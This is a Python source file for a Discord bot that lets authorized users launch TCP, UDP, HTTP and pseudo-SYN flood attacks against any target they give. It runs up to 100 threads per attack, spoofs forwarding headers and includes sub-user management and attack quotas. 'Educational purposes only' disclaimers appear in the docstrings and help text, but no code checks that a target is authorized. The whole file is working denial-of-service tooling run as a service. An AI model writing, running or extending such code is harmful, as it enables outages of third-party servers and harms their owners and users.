#!/usr/bin/env python3
"""
Educational DDoS Testing Bot - Python Version
FOR EDUCATIONAL PURPOSES ONLY
Use only on authorized systems you own.
"""

import os
import sys
import asyncio
import random
import socket
import struct
import time
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Set
from collections import deque
import logging

import discord
from discord.ext import commands
from dotenv import load_dotenv
import aiohttp
import psutil
from dataclasses import dataclass, field
import json
import signal

# ==================== CONFIGURATION ====================
load_dotenv()

class Config:
    def __init__(self):
        self.BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN', '')
        self.ADMIN_IDS = set(os.getenv('ADMIN_IDS', '').split(','))
        self.MAX_ATTACK_DURATION = int(os.getenv('MAX_ATTACK_DURATION', '1800'))
        self.MAX_CONCURRENT_ATTACKS = int(os.getenv('MAX_CONCURRENT_ATTACKS', '10'))
        self.DEFAULT_THREADS = int(os.getenv('DEFAULT_THREADS', '1000'))
        self.PERF_UPDATE_INTERVAL = int(os.getenv('PERF_UPDATE_INTERVAL', '5'))
        
        if not self.BOT_TOKEN:
            raise ValueError("DISCORD_BOT_TOKEN not found in .env file")

# ==================== DATA CLASSES ====================
@dataclass
class User:
    id: str
    is_sub_user: bool = False
    max_duration: int = 300  # 5 minutes default
    active_attacks: int = 0
    attack_limit: int = 3
    created_by: str = ""
    created_at: datetime = field(default_factory=datetime.now)

@dataclass
class PerformanceStats:
    cpu_usage: float = 0.0
    memory_usage: float = 0.0
    bandwidth: float = 0.0
    packet_rate: float = 0.0

@dataclass
class AttackSession:
    id: str
    target: str
    method: str
    started_by: str
    started_at: datetime = field(default_factory=datetime.now)
    duration: int = 300  # seconds
    threads: int = 1000
    packets_sent: int = 0
    data_sent: int = 0  # bytes
    is_running: bool = True
    performance: PerformanceStats = field(default_factory=PerformanceStats)
    stop_event: threading.Event = field(default_factory=threading.Event)

# ==================== BOT STATE ====================
class BotState:
    def __init__(self, config: Config):
        self.config = config
        self.admin_ids = config.ADMIN_IDS
        self.users: Dict[str, User] = {}
        self.active_attacks: Dict[str, AttackSession] = {}
        self.attack_history: List[AttackSession] = []
        self.total_attacks: int = 0
        self.total_packets: int = 0
        self.total_data: int = 0
        
        # Initialize admin users
        for admin_id in self.admin_ids:
            if admin_id:
                self.users[admin_id] = User(
                    id=admin_id,
                    is_sub_user=False,
                    max_duration=config.MAX_ATTACK_DURATION,
                    attack_limit=config.MAX_CONCURRENT_ATTACKS,
                    created_at=datetime.now()
                )
        
        self._lock = threading.RLock()
        self._performance_stats = PerformanceStats()
    
    def get_user(self, user_id: str) -> Optional[User]:
        with self._lock:
            return self.users.get(user_id)
    
    def add_attack(self, session: AttackSession):
        with self._lock:
            self.active_attacks[session.id] = session
            self.total_attacks += 1
            
            user = self.users.get(session.started_by)
            if user:
                user.active_attacks += 1
    
    def remove_attack(self, session_id: str):
        with self._lock:
            session = self.active_attacks.get(session_id)
            if session:
                user = self.users.get(session.started_by)
                if user:
                    user.active_attacks -= 1
                
                del self.active_attacks[session_id]
                self.attack_history.append(session)
                return session
        return None

# ==================== ATTACK METHODS ====================
class AttackMethods:
    @staticmethod
    def tcp_flood(session: AttackSession, state: BotState):
        """TCP Flood Attack - Educational Purpose Only"""
        def worker():
            while not session.stop_event.is_set():
                try:
                    # Try common ports
                    ports = [80, 443, 22, 21, 25, 110, 143, 993, 995, 3389, 8080, 8443]
                    port = random.choice(ports)
                    target = (session.target, port)
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect(target)
                    
                    # Send junk data
                    junk = os.urandom(1024)
                    sock.send(junk)
                    
                    # Update stats
                    with state._lock:
                        session.packets_sent += 1
                        session.data_sent += 1024
                        state.total_packets += 1
                        state.total_data += 1024
                    
                    sock.close()
                    
                except Exception:
                    pass
                
                time.sleep(0.01)  # Small delay to prevent overwhelming
        
        # Start multiple threads
        threads = []
        for _ in range(min(session.threads, 100)):  # Limit threads
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for stop signal
        session.stop_event.wait(timeout=session.duration)
        session.stop_event.set()
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1)

    @staticmethod
    def udp_flood(session: AttackSession, state: BotState):
        """UDP Flood Attack - Educational Purpose Only"""
        def worker():
            while not session.stop_event.is_set():
                try:
                    ports = [53, 123, 161, 389, 1900, 5060]
                    port = random.choice(ports)
                    target = (session.target, port)
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(3)
                    
                    # Send UDP packet
                    payload = os.urandom(1024)
                    sock.sendto(payload, target)
                    
                    # Update stats
                    with state._lock:
                        session.packets_sent += 1
                        session.data_sent += len(payload)
                        state.total_packets += 1
                        state.total_data += len(payload)
                    
                    sock.close()
                    
                except Exception:
                    pass
                
                time.sleep(0.01)
        
        threads = []
        for _ in range(min(session.threads, 100)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        session.stop_event.wait(timeout=session.duration)
        session.stop_event.set()
        
        for t in threads:
            t.join(timeout=1)

    @staticmethod
    def http_flood(session: AttackSession, state: BotState):
        """HTTP Flood Attack - Educational Purpose Only"""
        async def worker():
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            async with aiohttp.ClientSession() as client_session:
                while not session.stop_event.is_set():
                    try:
                        protocol = random.choice(['http', 'https'])
                        url = f"{protocol}://{session.target}/"
                        
                        # Add random headers
                        random_headers = headers.copy()
                        random_headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                        
                        async with client_session.get(url, headers=random_headers, timeout=5) as response:
                            # Update stats
                            with state._lock:
                                session.packets_sent += 1
                                session.data_sent += 512
                                state.total_packets += 1
                                state.total_data += 512
                                
                    except Exception:
                        pass
                    
                    await asyncio.sleep(0.1)
        
        # Run HTTP flood
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        tasks = []
        for _ in range(min(session.threads, 50)):  # Fewer threads for HTTP
            task = loop.create_task(worker())
            tasks.append(task)
        
        try:
            loop.run_until_complete(asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=session.duration
            ))
        except asyncio.TimeoutError:
            pass
        finally:
            session.stop_event.set()
            for task in tasks:
                task.cancel()
            loop.close()

    @staticmethod
    def syn_flood(session: AttackSession, state: BotState):
        """SYN Flood Simulation - Educational Purpose Only"""
        def worker():
            while not session.stop_event.is_set():
                try:
                    ports = [80, 443, 22, 3389, 8080, 8443]
                    port = random.choice(ports)
                    
                    # Create TCP connection (SYN)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((session.target, port))
                    sock.close()  # Immediately close (SYN flood simulation)
                    
                    # Update stats
                    with state._lock:
                        session.packets_sent += 1
                        session.data_sent += 60
                        state.total_packets += 1
                        state.total_data += 60
                        
                except Exception:
                    pass
                
                time.sleep(0.01)
        
        threads = []
        for _ in range(min(session.threads, 100)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        session.stop_event.wait(timeout=session.duration)
        session.stop_event.set()
        
        for t in threads:
            t.join(timeout=1)

# ==================== DISCORD BOT ====================
class DDoSBot(commands.Bot):
    def __init__(self, config: Config, state: BotState):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(
            command_prefix="!ddos ", 
            intents=intents,
            help_command=None  # Disable built-in help command
        )
        
        self.config = config
        self.state = state
        self.attack_methods = AttackMethods()
        
        # Add commands
        self.add_commands()
    
    def add_commands(self):
        @self.command(name='attack')
        async def attack(ctx, target: str, method: str, threads: int = None, duration: str = None):
            """Start an attack - Educational Purpose Only"""
            # Check authorization
            user = self.state.get_user(str(ctx.author.id))
            if not user:
                await ctx.send("❌ You are not authorized to use this bot.")
                return
            
            # Check attack limit
            if user.active_attacks >= user.attack_limit:
                await ctx.send(f"❌ You have reached your attack limit ({user.attack_limit} active attacks).")
                return
            
            # Set defaults
            threads = threads or self.config.DEFAULT_THREADS
            threads = min(threads, 10000)  # Safety limit
            
            # Parse duration
            attack_duration = user.max_duration
            if duration:
                try:
                    # Parse duration like "10m", "1h", "30s"
                    if duration.endswith('s'):
                        attack_duration = int(duration[:-1])
                    elif duration.endswith('m'):
                        attack_duration = int(duration[:-1]) * 60
                    elif duration.endswith('h'):
                        attack_duration = int(duration[:-1]) * 3600
                    else:
                        attack_duration = int(duration)
                    
                    if attack_duration > user.max_duration:
                        await ctx.send(f"❌ Duration exceeds your maximum allowed duration of {user.max_duration} seconds.")
                        return
                except ValueError:
                    await ctx.send("❌ Invalid duration format. Use like: 10m, 1h, 30s, or seconds.")
                    return
            
            # Validate method
            valid_methods = ['tcp', 'udp', 'http', 'syn']
            if method.lower() not in valid_methods:
                await ctx.send(f"❌ Invalid method. Available: {', '.join(valid_methods)}")
                await ctx.send("💡 Use `!ddos methods` for more information")
                return
            
            # Create session
            session_id = f"{ctx.author.id}-{int(time.time())}"
            session = AttackSession(
                id=session_id,
                target=target,
                method=method.lower(),
                started_by=str(ctx.author.id),
                duration=attack_duration,
                threads=threads
            )
            
            # Add to state
            self.state.add_attack(session)
            
            # Launch attack in background
            threading.Thread(
                target=self.launch_attack,
                args=(session,),
                daemon=True
            ).start()
            
            # Set auto-stop timer
            if attack_duration > 0:
                threading.Timer(
                    attack_duration,
                    self.stop_attack,
                    args=[session_id, ctx.channel.id]
                ).start()
            
            # Send confirmation
            embed = discord.Embed(
                title="🚀 Attack Launched Successfully",
                color=discord.Color.green(),
                description=f"Attack session started with ID: `{session_id[:8]}`",
                timestamp=datetime.now()
            )
            
            embed.add_field(name="🎯 Target", value=target, inline=True)
            embed.add_field(name="⚡ Method", value=method, inline=True)
            embed.add_field(name="🧵 Threads", value=str(threads), inline=True)
            embed.add_field(name="⏱️ Duration", value=f"{attack_duration}s", inline=True)
            embed.add_field(name="👤 Started By", value=ctx.author.name, inline=True)
            embed.add_field(name="🆔 Session ID", value=session_id[:8], inline=True)
            
            embed.set_footer(text="Use !ddos status to check progress | !ddos stop <id> to stop")
            
            await ctx.send(embed=embed)
        
        @self.command(name='stop')
        async def stop(ctx, session_id: str):
            """Stop an attack"""
            user = self.state.get_user(str(ctx.author.id))
            if not user:
                await ctx.send("❌ You are not authorized to use this bot.")
                return
            
            if session_id.lower() == 'all':
                # Stop all user's attacks
                stopped = 0
                with self.state._lock:
                    sessions_to_stop = []
                    for sid, session in self.state.active_attacks.items():
                        if session.started_by == str(ctx.author.id):
                            sessions_to_stop.append(sid)
                    
                    for sid in sessions_to_stop:
                        session = self.state.remove_attack(sid)
                        if session:
                            session.stop_event.set()
                            stopped += 1
                
                embed = discord.Embed(
                    title="⏹️ All Attacks Stopped",
                    color=discord.Color.orange(),
                    description=f"Stopped {stopped} active attacks",
                    timestamp=datetime.now()
                )
                await ctx.send(embed=embed)
                return
            
            # Stop specific attack
            with self.state._lock:
                session = self.state.active_attacks.get(session_id)
                if not session:
                    # Try to find by partial ID
                    for sid, sess in self.state.active_attacks.items():
                        if session_id in sid:
                            session = sess
                            session_id = sid
                            break
            
            if not session:
                await ctx.send("❌ Attack session not found")
                return
            
            # Check permissions
            if session.started_by != str(ctx.author.id):
                await ctx.send("❌ You don't have permission to stop this attack")
                return
            
            # Stop the attack
            session.stop_event.set()
            stopped_session = self.state.remove_attack(session_id)
            
            if stopped_session:
                embed = discord.Embed(
                    title="⏹️ Attack Stopped",
                    color=discord.Color.red(),
                    timestamp=datetime.now()
                )
                
                embed.add_field(name="Session ID", value=session_id[:8], inline=True)
                embed.add_field(name="Target", value=session.target, inline=True)
                embed.add_field(name="Total Packets", value=str(session.packets_sent), inline=True)
                embed.add_field(name="Total Data", value=self.format_bytes(session.data_sent), inline=True)
                embed.add_field(name="Duration", value=str(datetime.now() - session.started_at), inline=True)
                
                await ctx.send(embed=embed)
        
        @self.command(name='status')
        async def status(ctx):
            """Check attack status"""
            user = self.state.get_user(str(ctx.author.id))
            if not user:
                await ctx.send("❌ You are not authorized to use this bot.")
                return
            
            with self.state._lock:
                active_attacks = [
                    session for session in self.state.active_attacks.values()
                    if session.started_by == str(ctx.author.id)
                ]
            
            if not active_attacks:
                embed = discord.Embed(
                    title="📊 Status: No Active Attacks",
                    description="You don't have any active attacks running.",
                    color=discord.Color.greyple(),
                    timestamp=datetime.now()
                )
                await ctx.send(embed=embed)
                return
            
            embed = discord.Embed(
                title="📊 Active Attacks Status",
                description=f"You have {len(active_attacks)} active attack(s)",
                color=discord.Color.gold(),
                timestamp=datetime.now()
            )
            
            for session in active_attacks:
                duration = datetime.now() - session.started_at
                packet_rate = session.packets_sent / max(duration.total_seconds(), 1)
                
                embed.add_field(
                    name=f"🎯 {session.target}",
                    value=(
                        f"**Method:** {session.method}\n"
                        f"**ID:** {session.id[:8]}\n"
                        f"**Packets:** {session.packets_sent:,}\n"
                        f"**Data:** {self.format_bytes(session.data_sent)}\n"
                        f"**Duration:** {str(duration).split('.')[0]}\n"
                        f"**Rate:** {packet_rate:.0f} pkt/s\n"
                        f"**Threads:** {session.threads}"
                    ),
                    inline=True
                )
            
            await ctx.send(embed=embed)
        
        @self.command(name='stats')
        async def stats(ctx):
            """Show bot statistics"""
            user = self.state.get_user(str(ctx.author.id))
            if not user:
                await ctx.send("❌ You are not authorized to use this bot.")
                return
            
            # Get system stats
            cpu = psutil.cpu_percent()
            memory = psutil.virtual_memory().percent
            
            with self.state._lock:
                embed = discord.Embed(
                    title="📈 System Statistics & Performance",
                    description="Real-time monitoring of bot performance and resources",
                    color=discord.Color.teal(),
                    timestamp=datetime.now()
                )
                
                embed.add_field(name="💻 CPU Usage", value=f"{cpu:.1f}%", inline=True)
                embed.add_field(name="🧠 Memory Usage", value=f"{memory:.1f}%", inline=True)
                embed.add_field(name="🎯 Total Attacks", value=str(self.state.total_attacks), inline=True)
                embed.add_field(name="📦 Total Packets", value=f"{self.state.total_packets:,}", inline=True)
                embed.add_field(name="💾 Total Data", value=self.format_bytes(self.state.total_data), inline=True)
                embed.add_field(name="⚡ Active Attacks", value=str(len(self.state.active_attacks)), inline=True)
                embed.add_field(name="👤 Your Attacks", value=str(user.active_attacks), inline=True)
            
            embed.set_footer(text="Bot is optimized for maximum performance")
            await ctx.send(embed=embed)
        
        @self.command(name='methods')
        async def methods(ctx):
            """Show available attack methods"""
            embed = discord.Embed(
                title="⚡ Available Attack Methods",
                color=discord.Color.purple(),
                timestamp=datetime.now()
            )
            
            methods_info = [
                ("TCP Flood", "Sends TCP packets to multiple ports\n`!ddos attack <target> tcp`"),
                ("UDP Flood", "Sends large UDP packets to target\n`!ddos attack <target> udp`"),
                ("HTTP Flood", "Sends HTTP requests to web servers\n`!ddos attack <target> http`"),
                ("SYN Flood", "Sends TCP SYN packets (connection requests)\n`!ddos attack <target> syn`"),
            ]
            
            for name, desc in methods_info:
                embed.add_field(name=name, value=desc, inline=False)
            
            embed.set_footer(text="All attacks are optimized for maximum performance")
            await ctx.send(embed=embed)
        
        @self.command(name='help')
        async def help_cmd(ctx):
            """Show help information"""
            embed = discord.Embed(
                title="🤖 DDoS Bot - Help & Commands",
                color=discord.Color.purple(),
                description="Powerful DDoS testing bot with advanced features\n**FOR EDUCATIONAL PURPOSES ONLY**",
                timestamp=datetime.now()
            )
            
            embed.add_field(
                name="🎯 Attack Commands",
                value=(
                    "```!ddos attack <target> <method> [threads] [duration]\n"
                    "!ddos stop <session_id/all>\n"
                    "!ddos status\n"
                    "!ddos stats```"
                ),
                inline=False
            )
            
            embed.add_field(
                name="📚 Information",
                value="```!ddos methods\n!ddos help```",
                inline=False
            )
            
            # Admin commands
            user = self.state.get_user(str(ctx.author.id))
            if user and not user.is_sub_user:
                embed.add_field(
                    name="👑 Admin Commands",
                    value=(
                        "```!ddos adduser <user_id> [max_duration] [attack_limit]\n"
                        "!ddos removeuser <user_id>\n"
                        "!ddos listusers```"
                    ),
                    inline=False
                )
            
            embed.add_field(
                name="📝 Examples",
                value=(
                    "```!ddos attack 192.168.1.1 tcp 5000 10m\n"
                    "!ddos attack example.com http\n"
                    "!ddos stop all\n"
                    "!ddos status```"
                ),
                inline=False
            )
            
            embed.add_field(
                name="⚡ Features",
                value=(
                    "✅ Admin controls\n"
                    "✅ User management\n"
                    "✅ Attack limits\n"
                    "✅ Performance monitoring\n"
                    "✅ Real-time stats\n"
                    "✅ Multiple attack methods"
                ),
                inline=False
            )
            
            embed.set_footer(text="Use responsibly and only on authorized targets")
            await ctx.send(embed=embed)
        
        @self.command(name='adduser')
        @commands.has_permissions(administrator=True)
        async def adduser(ctx, user_id: str, max_duration: str = "300", attack_limit: str = "3"):
            """Add a user (Admin only)"""
            try:
                # Parse duration
                if max_duration.endswith('s'):
                    duration = int(max_duration[:-1])
                elif max_duration.endswith('m'):
                    duration = int(max_duration[:-1]) * 60
                elif max_duration.endswith('h'):
                    duration = int(max_duration[:-1]) * 3600
                else:
                    duration = int(max_duration)
                
                limit = int(attack_limit)
                limit = min(limit, 10)  # Safety limit
                
                with self.state._lock:
                    if user_id in self.state.users:
                        await ctx.send("❌ User already exists.")
                        return
                    
                    self.state.users[user_id] = User(
                        id=user_id,
                        is_sub_user=True,
                        max_duration=duration,
                        attack_limit=limit,
                        created_by=str(ctx.author.id)
                    )
                
                embed = discord.Embed(
                    title="✅ User Added Successfully",
                    color=discord.Color.green(),
                    timestamp=datetime.now()
                )
                
                embed.add_field(name="👤 User ID", value=user_id, inline=True)
                embed.add_field(name="⏱️ Max Duration", value=f"{duration}s", inline=True)
                embed.add_field(name="🎯 Attack Limit", value=str(limit), inline=True)
                embed.add_field(name="👑 Created By", value=ctx.author.name, inline=True)
                
                await ctx.send(embed=embed)
                
            except ValueError:
                await ctx.send("❌ Invalid parameters. Use: `!ddos adduser <user_id> [duration] [limit]`")
        
        @self.command(name='listusers')
        @commands.has_permissions(administrator=True)
        async def listusers(ctx):
            """List all users (Admin only)"""
            with self.state._lock:
                users = list(self.state.users.values())
            
            if not users:
                embed = discord.Embed(
                    title="📝 User List",
                    description="No users registered yet.",
                    color=discord.Color.greyple()
                )
                await ctx.send(embed=embed)
                return
            
            embed = discord.Embed(
                title="📝 Registered Users",
                description=f"Total users: {len(users)}",
                color=discord.Color.light_grey(),
                timestamp=datetime.now()
            )
            
            for user in users:
                user_type = "👤 Sub User" if user.is_sub_user else "👑 Administrator"
                
                embed.add_field(
                    name=f"{user_type} - {user.id}",
                    value=(
                        f"**Max Duration:** {user.max_duration}s\n"
                        f"**Attack Limit:** {user.attack_limit}\n"
                        f"**Active Attacks:** {user.active_attacks}"
                    ),
                    inline=True
                )
            
            await ctx.send(embed=embed)
    
    def launch_attack(self, session: AttackSession):
        """Launch attack based on method"""
        try:
            if session.method == 'tcp':
                self.attack_methods.tcp_flood(session, self.state)
            elif session.method == 'udp':
                self.attack_methods.udp_flood(session, self.state)
            elif session.method == 'http':
                self.attack_methods.http_flood(session, self.state)
            elif session.method == 'syn':
                self.attack_methods.syn_flood(session, self.state)
            
            # Cleanup
            session.stop_event.set()
            self.state.remove_attack(session.id)
            
        except Exception as e:
            print(f"Error in attack {session.id}: {e}")
    
    def stop_attack(self, session_id: str, channel_id: int = None):
        """Stop an attack and optionally notify"""
        with self.state._lock:
            session = self.state.active_attacks.get(session_id)
        
        if session:
            session.stop_event.set()
            self.state.remove_attack(session_id)
            
            if channel_id:
                # Could send notification via Discord webhook
                pass
    
    @staticmethod
    def format_bytes(bytes_size: int) -> str:
        """Format bytes to human readable string"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if bytes_size < 1024.0:
                return f"{bytes_size:.1f} {unit}"
            bytes_size /= 1024.0
        return f"{bytes_size:.1f} PB"
    
    async def on_ready(self):
        print(f"✅ Bot is ready! Logged in as {self.user}")
        print(f"🤖 Bot User: {self.user.name}")
        print(f"🆔 Bot ID: {self.user.id}")
        print("\n📋 Available Commands:")
        print("  !ddos attack <target> <method> [threads] [duration]")
        print("  !ddos stop <session_id/all>")
        print("  !ddos status")
        print("  !ddos stats")
        print("  !ddos methods")
        print("  !ddos help")
        print("  !ddos adduser <user_id> [duration] [limit] (Admin only)")
        print("  !ddos listusers (Admin only)")

# ==================== MAIN ====================
def main():
    """Main function"""
    print("🚀 Starting DDoS Discord Bot - Python Version")
    print("⚠️  FOR EDUCATIONAL PURPOSES ONLY")
    print("⚠️  Use only on authorized systems you own\n")
    
    try:
        # Load configuration
        config = Config()
        state = BotState(config)
        
        # Create bot
        bot = DDoSBot(config, state)
        
        # Run bot
        bot.run(config.BOT_TOKEN)
        
    except ValueError as e:
        print(f"❌ Configuration Error: {e}")
        print("\n📝 Please create a .env file with your configuration:")
        print("DISCORD_BOT_TOKEN=your_bot_token_here")
        print("ADMIN_IDS=your_discord_user_id")
        sys.exit(1)
    except discord.LoginFailure:
        print("❌ Failed to login to Discord. Check your bot token.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
        
        # Stop all attacks
        with state._lock:
            for session in state.active_attacks.values():
                session.stop_event.set()
        
        print("✅ Bot shutdown complete.")
        sys.exit(0)

if __name__ == "__main__":
    main()